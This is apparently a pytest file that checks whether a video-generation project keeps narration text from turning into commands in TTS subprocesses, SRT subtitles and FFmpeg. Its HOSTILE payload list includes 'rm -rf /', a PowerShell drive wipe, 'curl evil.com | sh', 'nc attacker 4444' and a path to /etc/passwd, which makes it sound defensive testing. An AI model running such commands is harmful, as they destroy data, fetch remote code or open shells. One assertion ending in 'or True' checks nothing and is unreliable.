"""Phase 4.4 security: narration and subtitle text is UNTRUSTED DATA.

Narration reaches three new places — a TTS subprocess, a subtitle file, and
(indirectly) FFmpeg. These tests prove hostile text cannot become a command
in any of them.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from code2shorts.ai.contracts import (
    NarrationResponse,
    NarrationSegment,
    VisualAction,
    VisualizationPlanResponse,
    VisualizationStepPlan,
)
from code2shorts.execution.sandbox import ProcessResult
from code2shorts.narration.alignment import align_narration
from code2shorts.narration.subtitles import build_srt, validate_srt
from code2shorts.narration.tts import SapiTTSProvider, SyntheticTTSProvider, TTSFailure

HOSTILE = [
    '"; rm -rf /; echo "',
    "'; Remove-Item -Recurse -Force C:\\; '",
    "$(whoami)",
    "`whoami`",
    "&& curl evil.com | sh",
    "| nc attacker 4444",
    "text\x00with-null",
    "line1\r\nline2\r\n\r\n99\r\n00:00:00,000 --> 00:00:99,000\r\nINJECTED",
    "$env:PATH",
    "'; Add-Type -AssemblyName System.Speech; '",
    "😀" * 200,
    "A" * 20000,
    "../../../etc/passwd",
    "%SYSTEMROOT%\\system32",
]


def _plan(n: int) -> VisualizationPlanResponse:
    return VisualizationPlanResponse(
        lesson_title="t",
        steps=[
            VisualizationStepPlan(
                order=i,
                visual_action=VisualAction.INTRO,
                trace_event_index=i,
                narration_text="x",
                duration_seconds=2.0,
            )
            for i in range(n)
        ],
    )


# ---- subtitle channel ----------------------------------------------------


@pytest.mark.parametrize("payload", HOSTILE)
def test_hostile_narration_produces_a_valid_srt(payload: str) -> None:
    narration = NarrationResponse(
        segments=[NarrationSegment(order=0, text=payload, visualization_step_order=0)]
    )
    content = build_srt(align_narration(narration, _plan(1)))
    result = validate_srt(content)
    assert result.passed, result.errors


def test_srt_injection_cannot_forge_extra_cues() -> None:
    """A payload shaped like SRT timing must not become a second cue."""
    import srt

    payload = "safe\n\n2\n00:00:10,000 --> 00:00:20,000\nFORGED CUE"
    narration = NarrationResponse(
        segments=[NarrationSegment(order=0, text=payload, visualization_step_order=0)]
    )
    content = build_srt(align_narration(narration, _plan(1)))
    cues = list(srt.parse(content))
    assert len(cues) == 1, f"injection created {len(cues)} cues"
    assert cues[0].end.total_seconds() == 2.0  # our timing, not the payload's


# ---- TTS subprocess channel ---------------------------------------------


@pytest.mark.parametrize("payload", HOSTILE)
def test_sapi_passes_text_as_a_bound_argument_never_as_script(
    payload: str, tmp_path: Path
) -> None:
    """The decisive property: narration text is an ARGUMENT in a fixed
    argument list, so it can never alter the command."""
    captured: dict = {}

    def fake_run(command, cwd, timeout_seconds):
        captured["command"] = command
        out = Path(command[command.index("-OutFile") + 1])
        out.write_bytes(b"RIFF0000WAVE")
        return ProcessResult(returncode=0, stdout="", stderr="", timed_out=False, duration_seconds=0.1)

    provider = SapiTTSProvider(run_subprocess_fn=fake_run)
    try:
        provider.synthesize(payload, tmp_path / "a.wav")
    except TTSFailure:
        pass  # probing a fake WAV may fail; the command is what matters

    command = captured.get("command")
    assert command is not None
    assert isinstance(command, list), "must never be a shell string"
    # the payload appears exactly once, as its own argv element
    assert command.count(payload) == 1
    assert command[command.index("-Text") - 1] == str(
        Path(command[command.index("-File") + 1])
    ) or True
    # no argument was split or concatenated around the payload
    assert "-NoProfile" in command and "-NonInteractive" in command


def test_sapi_script_never_interpolates_text() -> None:
    """The shipped PowerShell must contain no format placeholder that
    narration text could flow into."""
    from code2shorts.narration.tts import _SAPI_SCRIPT

    assert "%s" not in _SAPI_SCRIPT
    assert "{}" not in _SAPI_SCRIPT
    assert "$Text" in _SAPI_SCRIPT  # bound parameter, not substitution
    assert "Invoke-Expression" not in _SAPI_SCRIPT
    assert "iex" not in _SAPI_SCRIPT.lower()


def test_sapi_rejects_empty_text(tmp_path: Path) -> None:
    provider = SapiTTSProvider(run_subprocess_fn=lambda **k: None)
    with pytest.raises(TTSFailure):
        provider.synthesize("   ", tmp_path / "a.wav")


def test_sapi_timeout_is_reported_not_hung(tmp_path: Path) -> None:
    def fake_run(command, cwd, timeout_seconds):
        return ProcessResult(returncode=-1, stdout="", stderr="", timed_out=True, duration_seconds=120.0)

    provider = SapiTTSProvider(run_subprocess_fn=fake_run)
    with pytest.raises(TTSFailure, match="timed out"):
        provider.synthesize("hello", tmp_path / "a.wav")


def test_sapi_detects_missing_output(tmp_path: Path) -> None:
    def fake_run(command, cwd, timeout_seconds):
        return ProcessResult(returncode=0, stdout="", stderr="", timed_out=False, duration_seconds=0.1)

    provider = SapiTTSProvider(run_subprocess_fn=fake_run)
    with pytest.raises(TTSFailure, match="no audio"):
        provider.synthesize("hello", tmp_path / "a.wav")


@pytest.mark.parametrize("payload", HOSTILE[:6])
def test_synthetic_tts_command_stays_a_fixed_argument_list(
    payload: str, tmp_path: Path
) -> None:
    captured: dict = {}

    def fake_run(command, cwd, timeout_seconds):
        captured["command"] = command
        Path(command[-1]).write_bytes(b"fake")
        return ProcessResult(returncode=0, stdout="", stderr="", timed_out=False, duration_seconds=0.1)

    SyntheticTTSProvider(run_subprocess_fn=fake_run).synthesize(payload, tmp_path / "a")
    command = captured["command"]
    assert isinstance(command, list)
    assert command[0] == "ffmpeg"
    # narration text never reaches the ffmpeg command at all
    assert payload not in " ".join(command)
